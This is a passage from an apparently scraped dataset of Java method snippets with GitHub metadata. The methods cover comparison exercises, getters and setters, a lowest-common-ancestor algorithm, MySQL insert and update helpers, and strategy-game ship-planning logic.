"CompOperators", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int min(int numOne, int numTwo) {\n\n\t\tif (numOne > numTwo) {\n\n\t\t\treturn numTwo;\n\t\t} else {\n\n\t\t\treturn numOne;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day7/CompOperators.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57517, "method_name": "bigNum", "class_name": "CompOperators", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void bigNum(int number) {\n\t\t// ==\n\t\tif(number >= 1000){\n\t\t\tSystem.out.println(number + \" is big number\");\n\t\t} else {\n\t\t\tSystem.out.println(number + \" is regular number\");\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day7/CompOperators.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57518, "method_name": "badNumber", "class_name": "CompOperators", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void badNumber(int number) {\n\t\tif(number == 13) {\n\t\t\tSystem.out.println(\"Bad number is provided.\");\n\t\t} else {\n\t\t\tSystem.out.println(number + \" is good number.\");\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day7/CompOperators.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57519, "method_name": "getSectionId", "class_name": "Section", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getSectionId() {\n    return sectionId;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57520, "method_name": "setSectionId", "class_name": "Section", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSectionId(Integer sectionId) {\n    this.sectionId = sectionId;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57521, "method_name": "getName", "class_name": "Section", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57522, "method_name": "setName", "class_name": "Section", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setName(String name) {\n    this.name = name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/Section.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57523, "method_name": "lowestAncestor1", "class_name": "Code07_lowestAncestor", "params": ["Node", "Node", "Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node lowestAncestor1(Node head, Node o1, Node o2) {\n\t\tif (head == null) {\n\t\t\treturn null;\n\t\t}\n\t\t// key\u7684\u7236\u8282\u70b9\u662fvalue\n\t\tHashMap<Node, Node> parentMap = new HashMap<>();\n\t\tparentMap.put(head, null);\n\t\tfillParentMap(head, parentMap);\n\t\tHashSet<Node> o1Set = new HashSet<>();\n\t\tNode cur = o1;\n\t\to1Set.add(cur);\n\t\twhile (parentMap.get(cur) != null) {\n\t\t\tcur = parentMap.get(cur);\n\t\t\to1Set.add(cur);\n\t\t}\n\t\tcur = o2;\n\t\twhile (!o1Set.contains(cur)) {\n\t\t\tcur = parentMap.get(cur);\n\t\t}\n\t\treturn cur;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57524, "method_name": "fillParentMap", "class_name": "Code07_lowestAncestor", "params": ["Node", "HashMap<Node,Node>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void fillParentMap(Node head, HashMap<Node, Node> parentMap) {\n\t\tif (head.left != null) {\n\t\t\tparentMap.put(head.left, head);\n\t\t\tfillParentMap(head.left, parentMap);\n\t\t}\n\t\tif (head.right != null) {\n\t\t\tparentMap.put(head.right, head);\n\t\t\tfillParentMap(head.right, parentMap);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57525, "method_name": "lowestAncestor2", "class_name": "Code07_lowestAncestor", "params": ["Node", "Node", "Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node lowestAncestor2(Node head, Node o1, Node o2) {\n\t\treturn process(head, o1, o2).ans;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57526, "method_name": "process", "class_name": "Code07_lowestAncestor", "params": ["Node", "Node", "Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Info", "snippet": "\tpublic static Info process(Node X, Node o1, Node o2) {\n\t\tif (X == null) {\n\t\t\treturn new Info(null, false, false);\n\t\t}\n\t\tInfo leftInfo = process(X.left, o1, o2);\n\t\tInfo rightInfo = process(X.right, o1, o2);\n\t\tboolean findO1 = X == o1 || leftInfo.findO1 || rightInfo.findO1;\n\t\tboolean findO2 = X == o2 || leftInfo.findO2 || rightInfo.findO2;\n\t\t// \tO1\u548cO2\u6700\u521d\u7684\u4ea4\u6c47\u70b9\u5728\u54ea\uff1f\n\t\t// 1) \u5728\u5de6\u6811\u4e0a\u5df2\u7ecf\u63d0\u524d\u4ea4\u6c47\u4e86\n\t\t// 2) \u5728\u53f3\u6811\u4e0a\u5df2\u7ecf\u63d0\u524d\u4ea4\u6c47\u4e86\n\t\t// 3) \u6ca1\u6709\u5728\u5de6\u6811\u6216\u8005\u53f3\u6811\u4e0a\u63d0\u524d\u4ea4\u6c47\uff0cO1  O2 \u5168\u4e86\n\t\t// 4) \n\t\tNode ans = null;\n\t\tif (leftInfo.ans != null) {\n\t\t\tans = leftInfo.ans;\n\t\t}\n\t\tif (rightInfo.ans != null) {\n\t\t\tans = rightInfo.ans;\n\t\t}\n\t\tif (ans == null) {\n\t\t\tif (findO1 && findO2) {\n\t\t\t\tans = X;\n\t\t\t}\n\t\t}\n\t\treturn new Info(ans, findO1, findO2);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57527, "method_name": "generateRandomBST", "class_name": "Code07_lowestAncestor", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node generateRandomBST(int maxLevel, int maxValue) {\n\t\treturn generate(1, maxLevel, maxValue);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57528, "method_name": "generate", "class_name": "Code07_lowestAncestor", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node generate(int level, int maxLevel, int maxValue) {\n\t\tif (level > maxLevel || Math.random() < 0.5) {\n\t\t\treturn null;\n\t\t}\n\t\tNode head = new Node((int) (Math.random() * maxValue));\n\t\thead.left = generate(level + 1, maxLevel, maxValue);\n\t\thead.right = generate(level + 1, maxLevel, maxValue);\n\t\treturn head;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57529, "method_name": "pickRandomOne", "class_name": "Code07_lowestAncestor", "params": ["Node"], "throws": null, "modifiers": ["public", "static"], "return_type": "Node", "snippet": "\tpublic static Node pickRandomOne(Node head) {\n\t\tif (head == null) {\n\t\t\treturn null;\n\t\t}\n\t\tArrayList<Node> arr = new ArrayList<>();\n\t\tfillPrelist(head, arr);\n\t\tint randomIndex = (int) (Math.random() * arr.size());\n\t\treturn arr.get(randomIndex);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57530, "method_name": "fillPrelist", "class_name": "Code07_lowestAncestor", "params": ["Node", "ArrayList<Node>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void fillPrelist(Node head, ArrayList<Node> arr) {\n\t\tif (head == null) {\n\t\t\treturn;\n\t\t}\n\t\tarr.add(head);\n\t\tfillPrelist(head.left, arr);\n\t\tfillPrelist(head.right, arr);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57531, "method_name": "main", "class_name": "Code07_lowestAncestor", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint maxLevel = 4;\n\t\tint maxValue = 100;\n\t\tint testTimes = 1000000;\n\t\tfor (int i = 0; i < testTimes; i++) {\n\t\t\tNode head = generateRandomBST(maxLevel, maxValue);\n\t\t\tNode o1 = pickRandomOne(head);\n\t\t\tNode o2 = pickRandomOne(head);\n\t\t\tif (lowestAncestor1(head, o1, o2) != lowestAncestor2(head, o1, o2)) {\n\t\t\t\tSystem.out.println(\"Oops!\");\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"finish!\");\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code07_lowestAncestor.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57532, "method_name": "dispose", "class_name": "SecurityMachineComposer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispose() {\n\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/security/SecurityMachineComposer.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"id": 57533, "method_name": "getMessageArray", "class_name": "SecurityMachineComposer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object[] getMessageArray() {\n        return this.data.toArray();\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/security/SecurityMachineComposer.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"id": 57534, "method_name": "handleRequestInternal", "class_name": "WishMessageGeneratorController", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ModelAndView", "snippet": "\tpublic ModelAndView handleRequestInternal(HttpServletRequest req\t, HttpServletResponse res) throws Exception {\n\t\t Calendar calendar=null;\n\t\t int hour=0;\n\t\t String msg=null;\n\t\t// get System data\n\t\t calendar=Calendar.getInstance();\n\t\t//get current hour of the day\n\t\t hour=calendar.get(Calendar.HOUR_OF_DAY);\n\t\t if(hour<12)\n\t\t\t msg=\"Good Morning\";\n\t\t else if(hour<16)\n\t\t\t  msg=\"Good AfterNoon\";\n\t\t else if(hour<20)\n\t\t\t msg=\"Good Evening\";\n\t\t else\n\t\t\t msg=\"Good Night\";\n\t\t\t \n\t\t\n\t\treturn new ModelAndView(\"result\",\"resMsg\",msg);\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/MVCProj8-WishApp-AC-HandlerMappings/src/com/nt/controller/WishMessageGeneratorController.java", "stars": "8", "class_props": {"extends": "AbstractController", "implements": null, "modifiers": ["public"]}}, {"id": 57535, "method_name": "initElements", "class_name": "SettSlabBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SettSlabBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 57536, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SettSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57537, "method_name": "update", "class_name": "DMLImpl", "params": ["Map<String,String>", "String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Future<Integer>", "snippet": "    public Future<Integer> update(Map<String, String> fields, String tableName, String key, String keyValue) {\n        StringBuilder sb = new StringBuilder(\"UPDATE \");\n        sb.append(tableName);\n        sb.append(\" SET \");\n        Tuple tuple = Tuple.tuple();\n        int i = 0;\n        for (Map.Entry<String, String> entry : fields.entrySet()) {\n            sb.append(entry.getKey());\n            sb.append(\"=\");\n            sb.append(\"?\");\n            if (i != fields.size() - 1) {\n                sb.append(\",\");\n            }\n            tuple.addValue(entry.getValue());\n            i++;\n        }\n        sb.append(\" WHERE \");\n        sb.append(key);\n        sb.append(\"=?\");\n        tuple.addValue(keyValue);\n        String sql = sb.toString();\n        Promise<Integer> promise = Promise.promise();\n\n        client.preparedQuery(sql, tuple).onSuccess(rows -> {\n            promise.complete(1);\n        }).onFailure(promise::fail);\n        return promise.future();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57538, "method_name": "batchUpdate", "class_name": "DMLImpl", "params": ["List<Map>", "String", "List<TableColumnMeta>"], "throws": null, "modifiers": ["public"], "return_type": "Future<Integer>", "snippet": "    public Future<Integer> batchUpdate(List<Map<String, Object[]>> items, String tableName, List<TableColumnMeta> metas) {\n        Optional<TableColumnMeta> optional = metas.stream()\n                .filter(col -> StringUtils.nonEmpty(col.getKey()))\n                .findFirst();\n        Promise<Integer> promise = Promise.promise();\n        if (optional.isEmpty()) {\n            promise.fail(\"\u65e0\u6cd5\u627e\u5230key\u503c,\u6545\u53d6\u6d88\u66f4\u65b0\");\n        } else {\n            TableColumnMeta keyMeta = optional.get();\n            String sql = getUpdateSQL(metas, keyMeta, tableName);\n            List<Tuple> tuples = new ArrayList<>();\n            for (Map<String, Object[]> item : items) {\n                Object[] t = item.get(ROW);\n                Object[] tt = toConvertData(t);\n                Tuple tuple = Tuple.tuple();\n                for (Object o : tt) {\n                    tuple.addValue(o);\n                }\n                tuple.addValue(item.get(KEY)[0]);\n                tuples.add(tuple);\n            }\n\n            client.preparedBatch(sql, tuples)\n                    .onSuccess(r -> promise.complete(1))\n                    .onFailure(promise::fail);\n        }\n\n        return promise.future();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57539, "method_name": "insert", "class_name": "DMLImpl", "params": ["List<TableColumnMeta>", "Object", "String"], "throws": null, "modifiers": ["public"], "return_type": "Future<Long>", "snippet": "    public Future<Long> insert(List<TableColumnMeta> metas, Object[] columns, String tableName) {\n        String sql = getInsertSQL(metas, tableName);\n\n        Promise<Long> promise = Promise.promise();\n\n        Tuple tuple = Tuple.wrap(Arrays.asList(columns));\n\n        client.preparedQuery(sql, tuple).onSuccess(rows -> {\n            Long lastInsertId = rows.property(MySQLClient.LAST_INSERTED_ID);\n            promise.complete(lastInsertId);\n        }).onFailure(promise::fail);\n        return promise.future();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57540, "method_name": "batchInsert", "class_name": "DMLImpl", "params": ["List<TableColumnMeta>", "List<Object>", "String"], "throws": null, "modifiers": ["public"], "return_type": "Future<Object>", "snippet": "    public Future<Object> batchInsert(List<TableColumnMeta> metas, List<Object[]> rows, String tableName) {\n        String sql = getInsertSQL(metas, tableName);\n\n        List<Tuple> tuples = new ArrayList<>();\n\n        for (Object[] column : rows) {\n            Object[] obj = toConvertData(column);\n            Tuple tuple = Tuple.wrap(Arrays.asList(obj));\n            tuples.add(tuple);\n        }\n\n        Promise<Object> promise = Promise.promise();\n\n        Future<RowSet<Row>> future = client.preparedBatch(sql, tuples);\n        future.onSuccess(rowSet -> {\n            rowSet.property(MySQLClient.LAST_INSERTED_ID);\n            promise.complete((long) rows.size());\n        });\n        future.onFailure(promise::fail);\n\n        return promise.future();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57541, "method_name": "getInsertSQL", "class_name": "DMLImpl", "params": ["List<TableColumnMeta>", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getInsertSQL(List<TableColumnMeta> metas, String tableName) {\n        StringBuilder sb = new StringBuilder(\"INSERT INTO \");\n        StringBuilder vs = new StringBuilder();\n        sb.append(tableName);\n        sb.append(\"(\");\n        for (int i = 0; i < metas.size(); i++) {\n            TableColumnMeta meta = metas.get(i);\n            sb.append(meta.getField());\n            vs.append(\"?\");\n            if (i < metas.size() - 1) {\n                sb.append(\",\");\n                vs.append(\",\");\n            }\n        }\n        sb.append(\") \");\n        sb.append(\" VALUES(\");\n        sb.append(vs.toString());\n        sb.append(\")\");\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57542, "method_name": "getUpdateSQL", "class_name": "DMLImpl", "params": ["List<TableColumnMeta>", "TableColumnMeta", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUpdateSQL(List<TableColumnMeta> metas, TableColumnMeta keyMeta, String tableName) {\n        StringBuilder sb = new StringBuilder(\"UPDATE \");\n        sb.append(tableName);\n        sb.append(\" SET \");\n        for (int i = 0; i < metas.size(); i++) {\n            TableColumnMeta meta = metas.get(i);\n            sb.append(meta.getField());\n            sb.append(\"=?\");\n            if (i != metas.size() - 1) {\n                sb.append(\",\");\n            }\n        }\n        sb.append(\" WHERE \");\n        sb.append(keyMeta.getField());\n        sb.append(\"=?\");\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57543, "method_name": "toConvertData", "class_name": "DMLImpl", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object[] toConvertData(Object[] data) {\n        for (int i = 0; i < data.length; i++) {\n            var item = data[i];\n            if (item != null && item.equals(NULL)) {\n                data[i] = null;\n            }\n        }\n        return data;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57544, "method_name": "batchDelete", "class_name": "DMLImpl", "params": ["TableColumnMeta", "Object", "String"], "throws": null, "modifiers": ["public"], "return_type": "Future<Integer>", "snippet": "    public Future<Integer> batchDelete(TableColumnMeta keyMeta, Object[] keyValues, String tableName) {\n        var sb = new StringBuilder();\n        sb.append(\"DELETE FROM \");\n        sb.append(tableName);\n        sb.append(\" WHERE \");\n        sb.append(keyMeta.getField());\n        sb.append(\" =?\");\n        String sql = sb.toString();\n        List<Tuple> tuples = new ArrayList<>();\n        for (Object keyValue : keyValues) {\n            tuples.add(Tuple.of(keyValue));\n        }\n        Promise<Integer> promise = Promise.promise();\n        var future = client.preparedBatch(sql, tuples);\n        future.onSuccess(rows -> {\n            promise.complete(keyValues.length);\n        });\n        future.onFailure(promise::fail);\n\n        return promise.future();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57545, "method_name": "executeSqlUpdate", "class_name": "DMLImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Future<Integer>", "snippet": "    public Future<Integer> executeSqlUpdate(String sql) {\n        var promise = Promise.<Integer>promise();\n        var future = client.query(sql);\n        future.onSuccess(rows -> {\n            promise.complete(rows.rowCount());\n        });\n        future.onFailure(promise::fail);\n        return promise.future();\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57546, "method_name": "getAutoIncreaseField", "class_name": "DMLImpl", "params": ["List<TableColumnMeta>"], "throws": null, "modifiers": ["public"], "return_type": "Optional<TableColumnMeta>", "snippet": "    public Optional<TableColumnMeta> getAutoIncreaseField(List<TableColumnMeta> metas) {\n        Optional<TableColumnMeta> optional = Optional.empty();\n        for (TableColumnMeta tableColumnMeta : metas) {\n            if (tableColumnMeta.getExtra().contains(\"auto_increment\")) {\n                optional = Optional.of(tableColumnMeta);\n                break;\n            }\n        }\n        return optional;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/mysql/src/main/java/com/openjfx/database/mysql/impl/DMLImpl.java", "stars": "18", "class_props": {"extends": null, "implements": ["DML"], "modifiers": ["public"]}}, {"id": 57547, "method_name": "reset", "class_name": "ShipDecision", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {\n        shipPlan = null;\n        sysId = StarSystem.NULL_ID;\n        fleetOrders = null;\n        turns = Integer.MAX_VALUE;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57548, "method_name": "turns", "class_name": "ShipDecision", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float turns() {\n        return turns;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57549, "method_name": "multiTurn", "class_name": "ShipDecision", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean multiTurn() {\n        return turns() > 1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57550, "method_name": "hasSystem", "class_name": "ShipDecision", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean hasSystem()   { return sysId != StarSystem.NULL_ID; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57551, "method_name": "toString", "class_name": "ShipDecision", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        String design = bestDesign == null ? \"null\" : bestDesign.name();\n        String orders = fleetOrders == null ? \"null\" : fleetOrders.toString();\n        if (sysId == StarSystem.NULL_ID)\n            return concat(\"ShipDecision: \", design, \" in \", str((int)Math.ceil(turns)), \" turns using: \", orders);\n        else\n            return concat(\"ShipDecision: \", design, \" in \", str((int)Math.ceil(turns)), \" turns from: \", str(sysId));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57552, "method_name": "implement", "class_name": "ShipDecision", "params": ["List<FleetOrders>", "List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean implement(List<FleetOrders> orders, List<Integer> systemsCommitted) {\n        if ((fleetOrders == null) && !hasSystem()) {\n            shipPlan.plan.removeShipPlan(shipPlan);\n            return false;\n        }\n\n        if (hasSystem()) {\n            buildShipPlanOnPlanet();\n            if (!systemsCommitted.contains(sysId))\n                systemsCommitted.add(sysId);\n        }\n        else \n            assignFleetOrdersToPlan(orders);\n\n        // if satisfied, remove ship from fleet plan to eliminate from future decisions\n        if ((shipPlan.num <= 0) && (shipPlan.bc <= 0)) {\n            shipPlan.plan.removeShipPlan(shipPlan);\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57553, "method_name": "assignFleetOrdersToPlan", "class_name": "ShipDecision", "params": ["List<FleetOrders>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assignFleetOrdersToPlan(List<FleetOrders> orders) {\n        // send ship in fleet orders to fleetPlan dest\n        int numRequired = numShipsRequired(shipPlan.num, shipPlan.bc, bestDesign);\n        int numAvail = fleetOrders.numAvailable(bestDesign);\n        int numShips = min(numRequired, numAvail);\n\n        if (numShips == 0)\n            return;\n\n        // reassign fleet if possible (may currently be in transit to another location)\n        if (fleetOrders.owningFleet.canSend() && fleetOrders.owningFleet.canSendTo(shipPlan.plan.destId)) {\n            if (shipPlan.plan.goToStagingPoint) \n                fleetOrders.reassignShip(bestDesign, shipPlan.plan.currentDestId(), numShips);\n            else\n                fleetOrders.reassignShip(bestDesign, shipPlan.plan.destId, numShips);\n        }\n\n        bestDesign.addUsedCount(numShips);\n        shipPlan.num -= numShips;\n        shipPlan.bc -= (numShips * bestDesign.cost());\n        sysId = StarSystem.NULL_ID;\n\n        // remove associated fleet orders from orders list if it has no more ships to reassign\n        if (!fleetOrders.hasShips())\n            orders.remove(fleetOrders);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57554, "method_name": "numShipsRequired", "class_name": "ShipDecision", "params": ["int", "float", "ShipDesign"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int numShipsRequired(int num, float bc, ShipDesign d) {\n        int shipsByBC = (int) Math.ceil(bc / d.cost());\n        return Math.max(num, shipsByBC);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public"]}}, {"id": 57555, "method_name": "buildShipPlanOnPlanet", "class_name": "ShipDecision", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildShipPlanOnPlanet() {\n        StarSystem sys = galaxy().system(sysId);\n        ColonyShipyard shipyard = sys.colony().shipyard();\n        // if chosen planet is not building a ship, set the design\n        if (!shipyard.building())\n            shipyard.design(shipPlan.design);\n\n        // update queue data to properly evaluate future plans\n        shipyard.addQueuedBC(shipPlan.design.cost());\n\n        if (shipyard.design() == shipPlan.design)\n            shipyard.addDesiredShips(1);\n\n        shipPlan.num--;\n        shipPlan.bc -= shipPlan.design.cost();\n        \n        if (shipPlan.plan.priority() >= FleetPlan.INTERCEPT) \n            sys.empire().generalAI().rushShipSystems().add(sys);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ai/ShipDecision.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": 